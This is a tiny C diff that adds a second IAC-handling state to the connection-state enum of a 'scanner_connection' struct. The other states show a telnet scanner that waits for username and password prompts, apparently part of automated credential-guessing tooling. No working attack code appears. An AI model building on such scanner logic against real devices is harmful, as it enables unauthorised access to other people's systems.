@@ -29,6 +29,7 @@ struct scanner_connection {
         SC_CLOSED,
         SC_CONNECTING,
         SC_HANDLE_IACS,
+        SC_HANDLE_IACS_2,
         SC_WAITING_USERNAME,
         SC_WAITING_PASSWORD,
         SC_WAITING_PASSWD_RESP,
